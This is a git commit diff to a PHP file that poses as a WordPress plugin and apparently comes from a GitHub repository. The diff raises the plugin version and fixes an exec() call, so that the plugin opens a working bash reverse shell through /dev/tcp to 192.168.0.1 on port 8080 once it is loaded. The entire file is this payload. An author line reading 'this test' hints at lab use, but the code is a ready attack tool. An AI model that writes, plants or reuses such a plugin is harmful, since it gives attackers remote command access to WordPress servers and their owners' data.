fa5180745f4db7091b0c46304f311e30831bfd25
arm72 <36706874+arm72@users.noreply.github.com>
2024-08-26 15:35:27 -0700

    Add files via upload

--- wordpress_plugin_reverse_shell.php
+++ wordpress_plugin_reverse_shell.php
@@ -2,11 +2,11 @@
 
 /**
  * Plugin Name: wordpress_plugin_reverse_shell
- * Version: 1.0
+ * Version: 5.0
  * Author: this test
  * Author URI: https://github.com/arm72
  */
 
-exec("/bin/bash -c 'bash -i 2>&1 /dev/tcp/192.168.0.1/8080 0>&1'");
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.1/8080 0>&1'");
 
 ?>
